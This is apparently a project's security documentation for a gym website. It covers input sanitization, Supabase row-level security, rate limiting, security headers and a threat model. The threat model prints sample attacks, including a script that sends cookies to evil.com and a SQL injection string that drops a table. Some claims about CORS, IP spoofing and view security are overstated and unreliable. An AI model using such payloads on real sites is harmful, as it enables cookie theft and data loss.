# Brothers Gym Kazanlak - Security Documentation

**Project:** Brothers Gym Kazanlak Website  
**Domain:** brothersgym-kazanlak.bg  
**Generated:** 2025-11-24  
**Version:** 1.0.0

---

## Table of Contents

1. [Security Architecture Overview](#security-architecture-overview)
2. [Frontend Security](#frontend-security)
3. [Backend Security](#backend-security)
4. [Database Security](#database-security)
5. [Edge Function Security](#edge-function-security)
6. [Input Validation & Sanitization](#input-validation--sanitization)
7. [Rate Limiting & Abuse Prevention](#rate-limiting--abuse-prevention)
8. [Privacy & GDPR Compliance](#privacy--gdpr-compliance)
9. [Security Headers](#security-headers)
10. [Content Security Policy](#content-security-policy)
11. [Authentication & Authorization](#authentication--authorization)
12. [Security Best Practices](#security-best-practices)
13. [Threat Model](#threat-model)
14. [Security Testing & Monitoring](#security-testing--monitoring)
15. [Incident Response](#incident-response)

---

## 1. Security Architecture Overview

### 1.1 Multi-Layer Security Approach

The Brothers Gym website implements a comprehensive, defense-in-depth security strategy with multiple layers:

```
┌─────────────────────────────────────────────────────────────┐
│                    User Browser                              │
│  • CSP Enforcement                                          │
│  • Input Sanitization (DOMPurify)                          │
│  • Client-Side Validation                                  │
└─────────────────┬───────────────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────────────┐
│              Network Layer (HTTPS)                           │
│  • SSL/TLS Encryption                                       │
│  • Security Headers                                         │
│  • HSTS Enforcement                                         │
└─────────────────┬───────────────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────────────┐
│              Edge Functions Layer                            │
│  • Server-Side Validation                                   │
│  • Rate Limiting                                            │
│  • IP-Based Access Control                                 │
│  • CORS Protection                                          │
└─────────────────┬───────────────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────────────┐
│              Database Layer (Supabase)                       │
│  • Row Level Security (RLS)                                 │
│  • Database Views (PII Protection)                          │
│  • Query Parameterization                                   │
│  • Access Control Policies                                  │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 Security Principles

The implementation follows these core security principles:

- **Defense in Depth**: Multiple layers of security controls
- **Least Privilege**: Minimal access rights by default
- **Fail Secure**: System fails to a secure state
- **Privacy by Design**: GDPR compliance built-in from the start
- **Input Validation**: All user input is validated and sanitized
- **Security through Transparency**: Open security model with proper controls

---

## 2. Frontend Security

### 2.1 Input Sanitization

**Implementation:** `src/lib/security.ts`

All user inputs are sanitized using `isomorphic-dompurify` to prevent XSS attacks:

```typescript
import DOMPurify from 'isomorphic-dompurify';

/**
 * Sanitize user input to prevent XSS attacks
 */
export const sanitizeInput = (input: string): string => {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: [],      // Strip all HTML tags
    ALLOWED_ATTR: [],      // Strip all attributes
  });
};
```

**Protection Against:**
- Cross-Site Scripting (XSS)
- HTML injection
- Script injection
- Malicious HTML tags

**Usage Example:**
```typescript
const userComment = sanitizeInput(formData.comment);
// "<script>alert('xss')</script>" → ""
// "Hello <b>world</b>" → "Hello world"
```

### 2.2 URL Sanitization

Prevents malicious URL schemes and protocols:

```typescript
/**
 * Sanitize URL to prevent javascript: and data: protocols
 */
export const sanitizeUrl = (url: string): string => {
  const sanitized = url.trim().toLowerCase();
  
  // Block dangerous protocols
  if (sanitized.startsWith('javascript:') || 
      sanitized.startsWith('data:') ||
      sanitized.startsWith('vbscript:')) {
    return '';
  }
  
  try {
    const parsed = new URL(url);
    // Only allow safe protocols
    if (!['http:', 'https:', 'mailto:', 'tel:'].includes(parsed.protocol)) {
      return '';
    }
    return url;
  } catch {
    return ''; // Invalid URL
  }
};
```

**Protection Against:**
- JavaScript protocol injection (`javascript:alert('xss')`)
- Data URI injection (`data:text/html,<script>...`)
- VBScript injection
- Protocol-based attacks

### 2.3 Email & Name Validation

**Email Validation:**
```typescript
export const isValidEmail = (email: string): boolean => {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
};
```

**Name Validation:**
```typescript
export const isValidName = (name: string): boolean => {
  // Allows: letters (Latin + Cyrillic), spaces, hyphens, apostrophes
  // Length: 2-100 characters
  const nameRegex = /^[a-zA-Zа-яА-ЯёЁ\s\-']{2,100}$/;
  return nameRegex.test(name);
};
```

**Protections:**
- Prevents SQL injection attempts in name fields
- Blocks special characters that could be used in attacks
- Enforces reasonable length limits
- Supports multilingual names (Bulgarian + English)

### 2.4 Client-Side Rate Limiting

```typescript
/**
 * Rate limiting helper - checks if action is allowed based on timestamp
 */
export const isRateLimited = (
  lastAction: number | null,
  cooldownMs: number
): boolean => {
  if (!lastAction) return false;
  return Date.now() - lastAction < cooldownMs;
};
```

**Usage:**
- Prevents rapid form submissions
- Limits API call frequency
- Reduces automated abuse attempts

### 2.5 Secure Token Generation

```typescript
/**
 * Generate a cryptographically secure random token
 */
export const generateToken = (): string => {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array); // Uses Web Crypto API
  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
};
```

**Characteristics:**
- 256-bit entropy (32 bytes)
- Cryptographically secure random number generation
- Suitable for session tokens, CSRF tokens, etc.

### 2.6 Timing-Safe String Comparison

```typescript
/**
 * Secure string comparison to prevent timing attacks
 */
export const secureCompare = (a: string, b: string): boolean => {
  if (a.length !== b.length) return false;
  
  let result = 0;
  for (let i = 0; i < a.length; i++) {
    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
  }
  return result === 0;
};
```

**Protection Against:**
- Timing attacks
- Side-channel information leakage
- Token comparison vulnerabilities

---

## 3. Backend Security

### 3.1 Supabase Edge Functions

**Configuration:** `supabase/config.toml`

```toml
project_id = "kvgzaoiyyqxdqvyqdpfx"

[functions.submit-review]
verify_jwt = false  # Public function, uses IP-based rate limiting instead
```

### 3.2 Environment Variable Protection

**File:** `.env` (auto-generated, never committed)

```bash
VITE_SUPABASE_URL=https://kvgzaoiyyqxdqvyqdpfx.supabase.co
VITE_SUPABASE_PUBLISHABLE_KEY=eyJhbGc...
VITE_SUPABASE_PROJECT_ID=kvgzaoiyyqxdqvyqdpfx
```

**Security Measures:**
- `.env` excluded from version control via `.gitignore`
- Only publishable keys in frontend
- Service role keys stored server-side only
- Automatic key rotation supported

### 3.3 CORS Configuration

**Implementation:** All Edge Functions

```typescript
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Handle CORS preflight requests
if (req.method === 'OPTIONS') {
  return new Response(null, { headers: corsHeaders });
}
```

**Rationale:**
- Allows browser-based API calls
- Prevents unauthorized cross-origin requests
- Properly handles preflight requests
- Limited header exposure

---

## 4. Database Security

### 4.1 Row Level Security (RLS)

**Table:** `public.reviews`

```sql
-- Enable RLS
ALTER TABLE public.reviews ENABLE ROW LEVEL SECURITY;

-- Block all direct access to the main table
CREATE POLICY "No direct table access"
  ON public.reviews
  FOR ALL
  USING (false);
```

**Effect:**
- No direct public access to the `reviews` table
- All access must go through controlled views or Edge Functions
- Prevents unauthorized data reads/writes
- Enforces access control at database layer

### 4.2 Security-Definer View

**View:** `public.public_reviews`

```sql
CREATE VIEW public.public_reviews 
WITH (security_definer = true)
AS SELECT 
  id,
  name,
  rating,
  comment,
  tags,
  created_at
FROM public.reviews
ORDER BY created_at DESC;
```

**Security Architecture:**

```
┌──────────────────────────────────────────────────────────┐
│                    Client Request                         │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ▼
┌──────────────────────────────────────────────────────────┐
│            public_reviews VIEW                            │
│  • security_definer = true (bypass RLS)                  │
│  • Only exposes: id, name, rating, comment, tags,        │
│    created_at                                            │
│  • HIDES: ip_address (PII protected)                     │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ▼
┌──────────────────────────────────────────────────────────┐
│                 reviews TABLE                             │
│  • RLS Policy: Block ALL direct access                   │
│  • Contains: all fields including ip_address             │
│  • Only accessible via view or service role              │
└──────────────────────────────────────────────────────────┘
```

**Why security_definer?**

The view uses `security_definer = true` (default when not specified) to execute with the privileges of the view creator rather than the calling user. This allows:

1. **Global Visibility**: All reviews visible to all users (intended public data)
2. **PII Protection**: IP addresses remain hidden (only exposed fields in SELECT)
3. **RLS Bypass**: View bypasses restrictive RLS policies on underlying table
4. **Read-Only Access**: View provides SELECT-only access (no INSERT/UPDATE/DELETE)

**Alternative Rejected:** `security_invoker = true` would inherit the caller's RLS policies, causing reviews to be filtered by the user's IP address, breaking the global review visibility requirement.

### 4.3 Data Types & Constraints

**Table Schema:**
```sql
CREATE TABLE public.reviews (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  name TEXT NOT NULL,
  rating INTEGER NOT NULL CHECK (rating >= 1 AND rating <= 5),
  comment TEXT NOT NULL,
  tags TEXT[] DEFAULT ARRAY[]::TEXT[],
  ip_address TEXT NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);
```

**Security Features:**
- UUID primary keys (non-sequential, unpredictable)
- NOT NULL constraints prevent injection attempts via null values
- CHECK constraints enforce rating bounds (1-5)
- Timestamp includes timezone for audit trail accuracy
- Array type for tags prevents injection in delimited strings

---

## 5. Edge Function Security

### 5.1 Server-Side IP Detection

**Function:** `supabase/functions/submit-review/index.ts`

```typescript
// Get client IP from request headers
const clientIp = req.headers.get('x-forwarded-for')?.split(',')[0] || 
                 req.headers.get('x-real-ip') || 
                 'unknown';

console.log('Review submission from IP:', clientIp);
```

**Why Server-Side?**
- Client-side IP detection is unreliable and easily spoofed
- Server sees the actual connection source IP
- Proxy headers (`x-forwarded-for`, `x-real-ip`) handled properly
- Ensures accurate rate limiting enforcement

### 5.2 Input Validation (Server-Side)

```typescript
// Validate required fields
if (!reviewData.name || !reviewData.rating || !reviewData.comment) {
  return new Response(
    JSON.stringify({ error: 'Missing required fields' }),
    { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
  );
}

// Validate rating bounds
if (reviewData.rating < 1 || reviewData.rating > 5) {
  return new Response(
    JSON.stringify({ error: 'Rating must be between 1 and 5' }),
    { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
  );
}
```

**Validation Layers:**
1. **Presence Check**: Ensures required fields exist
2. **Type Check**: Implicit via TypeScript interface
3. **Range Check**: Rating must be 1-5
4. **Length Limits**: Enforced by frontend (max 1000 chars for comment)

### 5.3 Server-Side Rate Limiting

```typescript
// Rate limiting: Check if this IP has submitted a review in the last 7 days
const sevenDaysAgo = new Date();
sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);

const { data: recentReviews, error: checkError } = await supabase
  .from('reviews')
  .select('created_at')
  .eq('ip_address', clientIp)
  .gte('created_at', sevenDaysAgo.toISOString())
  .limit(1);

if (recentReviews && recentReviews.length > 0) {
  return new Response(
    JSON.stringify({ 
      error: 'You have already submitted a review recently. Please try again later.' 
    }),
    { status: 429, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
  );
}
```

**Rate Limiting Strategy:**
- **Window**: 7 days (168 hours)
- **Limit**: 1 review per IP address per window
- **Identifier**: Client IP address
- **Response**: HTTP 429 (Too Many Requests)
- **Bypass Protection**: Server-side enforcement prevents client bypass

### 5.4 Secure Database Insertion

```typescript
// Insert the review with IP address (stored for rate limiting only)
const { data, error } = await supabase
  .from('reviews')
  .insert({
    name: reviewData.name,
    rating: reviewData.rating,
    comment: reviewData.comment,
    tags: reviewData.tags || [],
    ip_address: clientIp,
  })
  .select()
  .single();
```

**Security Features:**
- Uses Supabase client SDK (parameterized queries)
- No SQL injection possible
- Service role key required (stored server-side)
- Automatic transaction handling
- Error handling prevents information leakage

### 5.5 Error Handling

```typescript
try {
  // ... operation logic ...
} catch (error) {
  console.error('Unexpected error:', error);
  return new Response(
    JSON.stringify({ error: 'Internal server error' }),
    { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
  );
}
```

**Security Practices:**
- Generic error messages to clients (no stack traces)
- Detailed logging server-side only
- Prevents information disclosure
- Maintains system stability during attacks

---

## 6. Input Validation & Sanitization

### 6.1 Multi-Stage Validation

**Stage 1: Client-Side Validation**
- Real-time feedback to users
- Reduces server load
- Not relied upon for security (can be bypassed)

**Stage 2: Client-Side Sanitization**
```typescript
const sanitizedComment = validateTextInput(formData.comment, 1000);
```

**Stage 3: Server-Side Validation**
```typescript
if (!reviewData.name || !reviewData.rating || !reviewData.comment) {
  return error response;
}
```

**Stage 4: Database Constraints**
```sql
CHECK (rating >= 1 AND rating <= 5)
NOT NULL
```

### 6.2 Text Input Validation Function

```typescript
/**
 * Validate and sanitize text input
 */
export const validateTextInput = (input: string, maxLength: number = 1000): string => {
  if (!input || typeof input !== 'string') {
    return '';
  }
  
  const trimmed = input.trim();
  const sanitized = sanitizeInput(trimmed);
  
  return sanitized.slice(0, maxLength);
};
```

**Operations:**
1. Type checking
2. Null/undefined handling
3. Whitespace trimming
4. HTML sanitization
5. Length enforcement

### 6.3 Allowed Character Sets

**Name Field:**
- Latin letters (a-z, A-Z)
- Cyrillic letters (а-я, А-Я, ё, Ё)
- Spaces, hyphens, apostrophes
- Length: 2-100 characters

**Comment Field:**
- All safe characters after DOMPurify sanitization
- No HTML tags
- No HTML attributes
- Maximum 1000 characters

**Tags Field:**
- Predefined set only (no user input)
- Array type prevents injection

---

## 7. Rate Limiting & Abuse Prevention

### 7.1 Review Submission Rate Limiting

**Implementation:** Server-side in Edge Function

**Parameters:**
- **Window**: 7 days (604,800 seconds)
- **Limit**: 1 submission per IP
- **Identifier**: Client IP address
- **Enforcement**: Database query checking recent submissions

**Algorithm:**
```
1. Extract client IP from request headers
2. Calculate timestamp 7 days ago
3. Query database for reviews from this IP since timestamp
4. IF count > 0 THEN reject with 429
5. ELSE allow submission and insert record
```

**Rationale for 7-Day Window:**
- Prevents spam and automated abuse
- Allows legitimate users to update opinions over time
- Balances security with usability
- Appropriate for review-style content

### 7.2 Client-Side Rate Limiting Helper

```typescript
// Example usage for form submissions
const SUBMIT_COOLDOWN = 5000; // 5 seconds
let lastSubmit = null;

if (isRateLimited(lastSubmit, SUBMIT_COOLDOWN)) {
  showError("Please wait before submitting again");
  return;
}

lastSubmit = Date.now();
// ... proceed with submission
```

**Purpose:**
- Improves UX (immediate feedback)
- Reduces server load
- Not relied upon for security

### 7.3 Future Rate Limiting Enhancements

**Recommended Additional Measures:**
- Token bucket algorithm for API calls
- Progressive delays for repeated violations
- CAPTCHA for suspicious activity
- Geolocation-based anomaly detection
- Machine learning-based abuse detection

---

## 8. Privacy & GDPR Compliance

### 8.1 Personal Data Handling

**Data Collected:**

| Field | Type | Purpose | Retention | Public |
|-------|------|---------|-----------|--------|
| Name | PII | Review attribution | Indefinite | Yes |
| Rating | Non-PII | Review content | Indefinite | Yes |
| Comment | PII | Review content | Indefinite | Yes |
| Tags | Non-PII | Review categorization | Indefinite | Yes |
| IP Address | PII | Rate limiting & abuse prevention | Indefinite | **NO** |
| Timestamp | Non-PII | Audit trail | Indefinite | Yes |

### 8.2 GDPR Principles Implemented

**1. Data Minimization**
- Only collect necessary data
- No email, phone, or physical address collected
- IP address used solely for rate limiting

**2. Purpose Limitation**
- Clear purpose for each field
- IP address not used for tracking or profiling
- No secondary use of collected data

**3. Storage Limitation**
- Reviews stored indefinitely (user expectation for testimonials)
- IP addresses stored but never exposed publicly
- No automatic deletion implemented (can be added if required)

**4. Privacy by Design**
- Database view architecture hides PII by default
- RLS policies enforce access control
- Server-side processing minimizes client exposure

**5. Transparency**
- Users aware they're submitting public reviews
- Rate limiting communicated upon violation
- No hidden data collection

### 8.3 PII Protection Architecture

```
┌────────────────────────────────────────────────────────────┐
│                     PUBLIC ACCESS                          │
│  Can see: name, rating, comment, tags, timestamp          │
│  Via: public_reviews view                                 │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│                    PROTECTED ACCESS                         │
│  Contains: ip_address (PII)                                │
│  Access: Service role only (Edge Functions)                │
│  Purpose: Rate limiting & abuse prevention                 │
│  Public Visibility: NEVER                                  │
└────────────────────────────────────────────────────────────┘
```

### 8.4 Right to Erasure (GDPR Article 17)

**Current Implementation:**
- Manual deletion upon request
- Contact gym via phone/email
- Admin can delete via database access

**Recommended Enhancement:**
```sql
-- Function to anonymize a review (GDPR erasure)
CREATE FUNCTION anonymize_review(review_id UUID) 
RETURNS VOID AS $$
BEGIN
  UPDATE reviews 
  SET 
    name = 'Anonymous User',
    comment = '[Comment removed by user request]',
    ip_address = '0.0.0.0'
  WHERE id = review_id;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

### 8.5 No Cookies Used

**Important:**
- No tracking cookies
- No analytics cookies
- No advertising cookies
- Only essential session data (if auth implemented)
- No GDPR cookie consent banner needed

---

## 9. Security Headers

### 9.1 HTTP Security Headers

**File:** `public/_headers`

```
/*
  # Security Headers
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  X-XSS-Protection: 1; mode=block
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=()
```

### 9.2 Header Explanations

**X-Frame-Options: DENY**
- **Purpose**: Prevents clickjacking attacks
- **Effect**: Page cannot be embedded in `<iframe>`, `<frame>`, `<embed>`, or `<object>`
- **Protection**: Prevents UI redressing attacks where malicious site overlays your site

**X-Content-Type-Options: nosniff**
- **Purpose**: Prevents MIME type sniffing
- **Effect**: Browser must respect declared `Content-Type` header
- **Protection**: Prevents execution of misinterpreted files (e.g., treating `.txt` as `.js`)

**X-XSS-Protection: 1; mode=block**
- **Purpose**: Enables browser's XSS filter (legacy protection)
- **Effect**: Browser stops page rendering if XSS detected
- **Note**: Modern browsers rely on CSP instead, but included for older browsers

**Referrer-Policy: strict-origin-when-cross-origin**
- **Purpose**: Controls how much referrer information is sent
- **Effect**: 
  - Same-origin: Full URL sent
  - Cross-origin HTTPS→HTTPS: Origin only
  - Cross-origin HTTPS→HTTP: No referrer
- **Protection**: Prevents leaking sensitive URL parameters to third parties

**Permissions-Policy**
- **Purpose**: Restricts browser features and APIs
- **Settings**:
  - `camera=()` - No access to camera API
  - `microphone=()` - No access to microphone API
  - `geolocation=()` - No access to location API
  - `interest-cohort=()` - Blocks FLoC tracking
- **Protection**: Minimizes attack surface, prevents tracking

### 9.3 Strict Transport Security (HSTS)

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

**Parameters:**
- `max-age=63072000` - 2 years in seconds
- `includeSubDomains` - Apply to all subdomains
- `preload` - Eligible for browser HSTS preload list

**Protection:**
- Forces HTTPS for all connections
- Prevents SSL stripping attacks
- Protects against man-in-the-middle attacks
- Prevents accidental HTTP requests

**HSTS Preload List:**
- Browsers hardcode HTTPS requirement
- No initial HTTP connection ever made
- Maximum protection against downgrade attacks

---

## 10. Content Security Policy

### 10.1 CSP Configuration

**File:** `public/_headers`

```
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://ai.gateway.lovable.dev https://api.ipify.org; 
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; 
  font-src 'self' https://fonts.gstatic.com data:; 
  img-src 'self' data: https:; 
  connect-src 'self' https://*.supabase.co https://api.ipify.org wss://*.supabase.co; 
  frame-ancestors 'none'; 
  base-uri 'self'; 
  form-action 'self';
```

### 10.2 CSP Directive Breakdown

**default-src 'self'**
- Baseline: Only allow resources from same origin
- Fallback for directives not explicitly set

**script-src 'self' 'unsafe-inline' 'unsafe-eval' https://ai.gateway.lovable.dev https://api.ipify.org**
- `'self'` - Allow scripts from same origin
- `'unsafe-inline'` - Allow inline `<script>` tags (required for React/Vite dev)
- `'unsafe-eval'` - Allow `eval()` (required for React dev tools)
- `https://ai.gateway.lovable.dev` - Lovable AI services
- `https://api.ipify.org` - IP detection service

**Note:** `unsafe-inline` and `unsafe-eval` reduce CSP protection but are necessary for React development. Production build could use stricter policy with nonces/hashes.

**style-src 'self' 'unsafe-inline' https://fonts.googleapis.com**
- `'self'` - Same-origin stylesheets
- `'unsafe-inline'` - Inline styles (required for Tailwind, styled components)
- `https://fonts.googleapis.com` - Google Fonts CSS

**font-src 'self' https://fonts.gstatic.com data:**
- `'self'` - Same-origin fonts
- `https://fonts.gstatic.com` - Google Fonts font files
- `data:` - Base64-encoded fonts

**img-src 'self' data: https:**
- `'self'` - Same-origin images
- `data:` - Base64-encoded images
- `https:` - All HTTPS images (allows external image sources)

**connect-src 'self' https://*.supabase.co https://api.ipify.org wss://*.supabase.co**
- `'self'` - Same-origin API calls
- `https://*.supabase.co` - Supabase API endpoints (all subdomains)
- `https://api.ipify.org` - IP detection API
- `wss://*.supabase.co` - WebSocket connections (for Supabase Realtime)

**frame-ancestors 'none'**
- Prevents page from being embedded in frames
- Modern replacement for `X-Frame-Options: DENY`
- More flexible than X-Frame-Options

**base-uri 'self'**
- Restricts URLs that can appear in `<base>` tag
- Prevents base tag hijacking attacks

**form-action 'self'**
- Restricts URLs that forms can submit to
- Prevents form hijacking to external domains

### 10.3 CSP Violation Reporting

**Recommended Addition:**
```
Content-Security-Policy-Report-Only: 
  default-src 'self'; 
  report-uri /api/csp-report;
```

**Benefits:**
- Monitor policy violations without blocking
- Detect potential attacks
- Identify legitimate violations before enforcement
- Gradual policy tightening

**Implementation** (Future Enhancement):
```typescript
// Edge Function: supabase/functions/csp-report/index.ts
Deno.serve(async (req) => {
  const report = await req.json();
  console.log('CSP Violation:', JSON.stringify(report, null, 2));
  
  // Store in database for analysis
  await supabase.from('csp_violations').insert({
    report: report,
    timestamp: new Date().toISOString()
  });
  
  return new Response('OK', { status: 204 });
});
```

---

## 11. Authentication & Authorization

### 11.1 Current Authentication Status

**Status:** Not yet implemented (infrastructure ready)

**Supabase Auth Configuration:**
- Supabase Auth enabled
- Email/password authentication available
- OAuth providers can be added
- JWT-based session management
- Automatic token refresh

### 11.2 Planned Authentication Flow

**Registration:**
```
1. User submits email + password
2. Client calls supabase.auth.signUp()
3. Supabase creates user in auth.users table
4. Email verification sent (if enabled)
5. User confirms email
6. Account activated
```

**Login:**
```
1. User submits email + password
2. Client calls supabase.auth.signInWithPassword()
3. Supabase validates credentials
4. JWT access token + refresh token returned
5. Tokens stored in browser (secure httpOnly cookies preferred)
6. User authenticated
```

**Session Management:**
```
1. Access token included in API requests (Authorization header)
2. Server validates JWT signature and expiration
3. If expired, client requests new token using refresh token
4. Supabase handles token refresh automatically
```

### 11.3 Authorization Patterns

**Current:** Public-only access (reviews system)

**Recommended Future Patterns:**

**Row-Level Security Example:**
```sql
-- Users can only see their own bookings
CREATE POLICY "Users see own bookings"
  ON public.bookings
  FOR SELECT
  USING (auth.uid() = user_id);

-- Users can create their own bookings
CREATE POLICY "Users create own bookings"
  ON public.bookings
  FOR INSERT
  WITH CHECK (auth.uid() = user_id);
```

**Role-Based Access Control:**
```sql
-- Create role enum
CREATE TYPE app_role AS ENUM ('admin', 'coach', 'member');

-- User roles table
CREATE TABLE user_roles (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
  role app_role NOT NULL,
  UNIQUE(user_id, role)
);

-- Check role function (security_definer to avoid RLS recursion)
CREATE FUNCTION has_role(_user_id UUID, _role app_role)
RETURNS BOOLEAN AS $$
  SELECT EXISTS (
    SELECT 1 FROM user_roles 
    WHERE user_id = _user_id AND role = _role
  );
$$ LANGUAGE SQL STABLE SECURITY DEFINER;

-- Admin-only policy example
CREATE POLICY "Admins can manage users"
  ON public.user_profiles
  FOR ALL
  USING (has_role(auth.uid(), 'admin'));
```

### 11.4 Security Considerations for Auth

**DO:**
- ✅ Use Supabase Auth built-in functions
- ✅ Enable email verification
- ✅ Implement strong password requirements
- ✅ Use RLS policies for authorization
- ✅ Store tokens securely (httpOnly cookies preferred)
- ✅ Implement password reset flow
- ✅ Log authentication events

**DON'T:**
- ❌ Store passwords in plain text
- ❌ Use localStorage for sensitive tokens (XSS risk)
- ❌ Check roles client-side only
- ❌ Trust client-provided user IDs
- ❌ Use weak password policies
- ❌ Implement custom auth (use proven solutions)

---

## 12. Security Best Practices

### 12.1 Implemented Best Practices

**✅ Input Validation**
- Multi-layer validation (client + server + database)
- Type checking and sanitization
- Length limits enforced
- Character set restrictions

**✅ Output Encoding**
- HTML sanitization via DOMPurify
- Safe rendering in React (automatic escaping)
- No `dangerouslySetInnerHTML` used

**✅ Parameterized Queries**
- Supabase SDK uses parameterized queries
- No raw SQL concatenation
- SQL injection prevented by design

**✅ Least Privilege**
- RLS policies restrict database access
- Views expose minimal data
- Edge Functions use appropriate service roles
- No unnecessary permissions granted

**✅ Defense in Depth**
- Multiple security layers
- Redundant controls
- Fail-secure design

**✅ Secure Communication**
- HTTPS enforced via HSTS
- TLS 1.2+ required
- Certificate pinning possible

**✅ Error Handling**
- Generic error messages to clients
- Detailed logging server-side
- No stack traces exposed

**✅ Security Headers**
- Comprehensive header set
- CSP implemented
- HSTS with preload

**✅ Rate Limiting**
- Server-side enforcement
- IP-based tracking
- Reasonable limits set

**✅ Privacy Protection**
- PII minimized
- GDPR compliance
- IP addresses not exposed

### 12.2 Code Security Guidelines

**React Component Security:**
```typescript
// ✅ GOOD: Safe rendering
<div>{sanitizedUserInput}</div>

// ❌ BAD: XSS vulnerability
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ GOOD: Validated props
if (!isValidEmail(email)) return null;

// ❌ BAD: Unvalidated external data
<a href={userProvidedUrl}>Click</a>
```

**API Call Security:**
```typescript
// ✅ GOOD: Use Supabase SDK
const { data } = await supabase.from('table').select();

// ❌ BAD: Raw SQL (never do this)
await supabase.rpc('execute_sql', { query: userInput });

// ✅ GOOD: Parameterized
await supabase.from('users').select().eq('id', userId);

// ❌ BAD: String concatenation
await fetch(`/api/users/${userId}`); // OK if userId is validated
```

**Secret Management:**
```typescript
// ✅ GOOD: Environment variables
const apiKey = import.meta.env.VITE_SUPABASE_KEY;

// ❌ BAD: Hardcoded secrets
const apiKey = "sk_live_abc123..."; // NEVER!

// ✅ GOOD: Server-side only
// In Edge Function:
const serviceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY');

// ❌ BAD: Exposing service keys to client
const serviceKey = import.meta.env.VITE_SERVICE_KEY; // Insecure!
```

### 12.3 Dependency Security

**Current Approach:**
- Use well-maintained packages
- Regular dependency updates
- Security vulnerability scanning (via GitHub Dependabot)
- Lock files committed (package-lock.json, bun.lockb)

**Key Dependencies Security:**
- `@supabase/supabase-js` - Official SDK, well-maintained
- `isomorphic-dompurify` - Industry-standard sanitization
- `react` - Large community, fast security patches
- `@radix-ui/*` - Accessibility-first, security-conscious
- `tailwindcss` - No runtime, compile-time only

**Recommended Practice:**
```bash
# Check for vulnerabilities
npm audit

# Update dependencies
npm update

# Check for outdated packages
npm outdated
```

---

## 13. Threat Model

### 13.1 Identified Threats & Mitigations

| Threat | Severity | Mitigation | Status |
|--------|----------|------------|--------|
| **Cross-Site Scripting (XSS)** | High | DOMPurify sanitization, CSP, React auto-escaping | ✅ Mitigated |
| **SQL Injection** | High | Parameterized queries via Supabase SDK | ✅ Mitigated |
| **Clickjacking** | Medium | X-Frame-Options, CSP frame-ancestors | ✅ Mitigated |
| **CSRF** | Medium | SameSite cookies (when auth added), CORS | ⚠️ Partial |
| **Rate Limiting Bypass** | Medium | Server-side IP-based rate limiting | ✅ Mitigated |
| **Data Breach** | High | RLS policies, PII protection architecture | ✅ Mitigated |
| **Man-in-the-Middle** | High | HTTPS, HSTS, certificate validation | ✅ Mitigated |
| **Brute Force Attacks** | Medium | Rate limiting (when auth added) | 🔄 Pending |
| **DDoS** | Medium | Netlify/Supabase infrastructure protection | ✅ Mitigated |
| **Session Hijacking** | High | Secure cookies, httpOnly (when auth added) | 🔄 Pending |
| **Malicious File Upload** | Low | No file upload implemented | N/A |
| **Information Disclosure** | Low | Generic errors, minimal headers, no debug info | ✅ Mitigated |

### 13.2 Attack Scenarios & Defenses

**Scenario 1: XSS Attack via Review Comment**

**Attack:**
```
User submits review:
Name: "John Doe"
Comment: "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
```

**Defense Layers:**
1. Client-side DOMPurify strips `<script>` tag
2. Server-side validation checks for malicious patterns
3. React auto-escapes during rendering
4. CSP blocks inline scripts
5. No sensitive data in cookies (yet)

**Result:** Attack fails at multiple layers

---

**Scenario 2: SQL Injection via Name Field**

**Attack:**
```
Name: "'; DROP TABLE reviews; --"
```

**Defense Layers:**
1. Name validation regex rejects special characters
2. Supabase SDK uses parameterized queries
3. Database user has limited permissions
4. RLS policies provide additional protection

**Result:** Attack blocked, invalid input rejected

---

**Scenario 3: Rate Limiting Bypass**

**Attack:**
```
Attacker rotates IP addresses using proxy list to submit 100 reviews
```

**Defense Layers:**
1. Server-side IP detection from request headers
2. 7-day window prevents rapid submissions
3. Supabase rate limiting on database operations
4. Edge Function execution limits

**Partial Success:** Attacker could submit multiple reviews from different IPs, but at much slower rate

**Recommendation:** Add CAPTCHA for suspicious patterns

---

**Scenario 4: Clickjacking Attack**

**Attack:**
```html
<iframe src="https://brothersgym-kazanlak.bg/reviews">
</iframe>
<!-- Overlay transparent fake buttons to trick user -->
```

**Defense Layers:**
1. X-Frame-Options: DENY prevents iframe embedding
2. CSP frame-ancestors 'none' provides modern protection
3. Browser enforces both headers

**Result:** Page cannot be framed, attack fails

---

**Scenario 5: GDPR Violation - IP Exposure**

**Attack:**
```
Attacker queries public_reviews view:
SELECT * FROM public_reviews;
```

**Defense Layers:**
1. View only exposes: id, name, rating, comment, tags, created_at
2. ip_address column not in view SELECT clause
3. Direct table access blocked by RLS policy
4. Service role required for direct table access

**Result:** IP addresses remain private, GDPR compliant

---

### 13.3 Future Threat Considerations

